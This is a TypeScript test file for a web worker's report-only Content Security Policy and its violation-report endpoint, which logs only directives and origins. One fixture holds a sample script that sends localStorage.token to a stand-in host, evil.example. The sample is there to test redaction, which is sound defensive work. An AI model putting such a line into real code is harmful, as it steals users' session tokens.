/**
 * The report-only script policy reaches every app document, and its reports
 * come back to a log that keeps origins only: never a note's path, a token in
 * a query, or the script text a browser may attach.
 */
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import worker from "./index";
import { CSP_REPORT_PATH, EMPTY_STYLE_HASH, parseCspReport, SCRIPT_POLICY, SHELL_SCRIPT_HASHES, SHELL_STYLE_HASHES } from "./cspReport";
import { ENFORCED_POLICY, SECURITY_HEADERS } from "./securityHeaders";

const CTX = { waitUntil: (promise: Promise<unknown>) => void promise, passThroughOnException: () => {} } as unknown as ExecutionContext;
const assets = vi.fn(() => new Response("<!doctype html>", { headers: { "Content-Type": "text/html" } }));
const ENV = { CONVEX_ORIGIN: "https://example-deployment.convex.site", ASSETS: { fetch: assets } as unknown as Fetcher };

let logs: string[];
beforeEach(() => {
  logs = [];
  vi.stubGlobal("fetch", vi.fn(() => new Response("upstream")));
  vi.spyOn(console, "log").mockImplementation((line: string) => void logs.push(line));
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

function report(body: unknown, init: RequestInit = {}): Promise<Response> {
  const request = new Request(`https://context.lc${CSP_REPORT_PATH}`, {
    method: "POST",
    headers: { "Content-Type": "application/csp-report" },
    body: JSON.stringify(body),
    ...init,
  });
  return worker.fetch(request, ENV, CTX) as Promise<Response>;
}

const LEAKY = {
  "document-uri": "https://context.lc/note/@acme/projects/secret-merger.md?token=abc123",
  "blocked-uri": "https://evil.example/steal.js?t=abc123",
  "effective-directive": "script-src-elem",
  "script-sample": "fetch('https://evil.example/'+localStorage.token)",
};

describe("the policy", () => {
  it("is report-only on the app document and names the report path", async () => {
    const response = await worker.fetch(new Request("https://context.lc/console"), ENV, CTX);
    expect(response.headers.get("Content-Security-Policy-Report-Only")).toBe(SCRIPT_POLICY);
    expect(SCRIPT_POLICY).toContain(`report-uri ${CSP_REPORT_PATH}`);
    expect(SCRIPT_POLICY).toContain("object-src 'none'");
    // Enforcing CSP says who may frame, where forms go, and bars plugins and <base>; scripts and styles are not blocked yet.
    expect(response.headers.get("Content-Security-Policy")).toBe(ENFORCED_POLICY);
  });

  it("allows no host it does not need", () => {
    const hosts = SCRIPT_POLICY.match(/https:\/\/[^\s;]+/g) ?? [];
    expect(hosts).toEqual([
      "https://challenges.cloudflare.com",
      "https://static.cloudflareinsights.com",
      "https://static.ads-twitter.com",
      "https://connect.facebook.net",
    ]);
    expect(SCRIPT_POLICY).not.toMatch(/'unsafe-inline'|'unsafe-eval'|\*/);
  });

  // The shell's inline scripts run by hash. One edited without its hash here
  // would be blocked once the policy enforces, so the two are pinned together.
  it("names every inline script in the web shell by its hash, and no other", () => {
    const shell = readFileSync(join(__dirname, "..", "..", "..", "apps", "mobile", "public", "index.html"), "utf8");
    const inline = [...shell.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/g)]
      .filter(([, attrs]) => !/\bsrc=|\btype="application\/(?:ld\+)?json"/.test(attrs))
      .map(([, , body]) => `sha256-${createHash("sha256").update(body, "utf8").digest("base64")}`);
    expect(inline.length).toBeGreaterThan(0);
    expect(SHELL_SCRIPT_HASHES).toEqual(inline);
    for (const hash of inline) expect(SCRIPT_POLICY).toContain(`'${hash}'`);
  });

  // The style candidate is measured the same way: the shell's inline styles
  // by hash, the empty sheet React Native Web fills by insertRule, and never
  // 'unsafe-inline'.
  it("names every inline style in the web shell by its hash, plus the empty sheet, and nothing unsafe", () => {
    const shell = readFileSync(join(__dirname, "..", "..", "..", "apps", "mobile", "public", "index.html"), "utf8");
    const inline = [...shell.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/g)].map(
      ([, body]) => `sha256-${createHash("sha256").update(body, "utf8").digest("base64")}`,
    );
    expect(inline.length).toBeGreaterThan(0);
    expect(SHELL_STYLE_HASHES).toEqual(inline);
    expect(EMPTY_STYLE_HASH).toBe(`sha256-${createHash("sha256").update("", "utf8").digest("base64")}`);
    const style = SCRIPT_POLICY.split(";").map((part) => part.trim()).find((part) => part.startsWith("style-src "));
    expect(style).toBe(`style-src 'self' ${[...inline, EMPTY_STYLE_HASH].map((hash) => `'${hash}'`).join(" ")}`);
  });

  // Two frames run script this policy would block, and a quiet report log
  // cannot show it: they run only when someone opens a plugin or exports a
  // drawing. The plugin sandbox is a `srcdoc` document, which inherits the
  // app's policy, and runs its bootstrap and each plugin as inline script; the
  // drawing editor's bundled WebAssembly glue builds functions with
  // `new Function`. Until each is moved or rebuilt, the policy stays report-only.
  it("stays report-only while a frame of ours needs inline script or eval", () => {
    const repo = join(__dirname, "..", "..", "..");
    const sandbox = readFileSync(join(repo, "packages", "obsidian-runtime", "src", "sandbox", "lifecycle.js"), "utf8");
    // The editor bundle is built, not committed; the dependency that brings
    // the `new Function` in is.
    const app = JSON.parse(readFileSync(join(repo, "apps", "mobile", "package.json"), "utf8")) as { dependencies?: Record<string, string> };
    const needs = [
      ...(/script\.textContent\s*=/.test(sandbox) ? ["plugin sandbox: inline script in a srcdoc frame"] : []),
      ...(app.dependencies?.["@excalidraw/excalidraw"] ? ["drawing editor: Excalidraw's WebAssembly glue calls new Function"] : []),
    ];
    if (needs.length > 0) expect(SECURITY_HEADERS["Content-Security-Policy"], needs.join("; ")).not.toContain("script-src");
  });
});

describe("the report endpoint", () => {
  it("logs the directive and origins, and nothing else from the report", async () => {
    const response = await report({ "csp-report": LEAKY });
    expect(response.status).toBe(204);
    expect(await response.text()).toBe("");
    expect(logs).toHaveLength(1);
    expect(JSON.parse(logs[0])).toEqual({
      event: "csp_report_only_violation",
      directive: "script-src-elem",
      blocked: "https://evil.example",
      page: "https://context.lc",
    });
    expect(logs[0]).not.toMatch(/secret-merger|abc123|localStorage|steal/);
  });

  it("reads the Reporting API's array shape", () => {
    expect(
      parseCspReport(JSON.stringify([{ type: "csp-violation", body: { documentURL: LEAKY["document-uri"], blockedURL: "inline", effectiveDirective: "script-src-elem" } }, { type: "deprecation", body: {} }])),
    ).toEqual([{ directive: "script-src-elem", blocked: "inline", page: "https://context.lc" }]);
  });

  it("never logs a directive or keyword it does not recognise verbatim", () => {
    const [violation] = parseCspReport(JSON.stringify({ "csp-report": { "effective-directive": "x; secret note text", "blocked-uri": "notes about the merger" } }));
    expect(violation).toEqual({ directive: "unknown", blocked: "unparsed", page: "none" });
  });

  it("answers anything that is not a POST with 405, and logs nothing", async () => {
    const response = await worker.fetch(new Request(`https://context.lc${CSP_REPORT_PATH}`), ENV, CTX);
    expect(response.status).toBe(405);
    expect(logs).toEqual([]);
    expect(assets).not.toHaveBeenCalledWith(expect.objectContaining({ url: expect.stringContaining(CSP_REPORT_PATH) }));
  });

  it("refuses an oversized body without reading it", async () => {
    const response = await report({ "csp-report": LEAKY }, { headers: { "Content-Length": String(1024 * 1024) } });
    expect(response.status).toBe(413);
    expect(logs).toEqual([]);
  });

  it("treats junk as no violations", async () => {
    const response = await worker.fetch(new Request(`https://context.lc${CSP_REPORT_PATH}`, { method: "POST", body: "not json" }), ENV, CTX);
    expect(response.status).toBe(204);
    expect(logs).toEqual([]);
  });
});
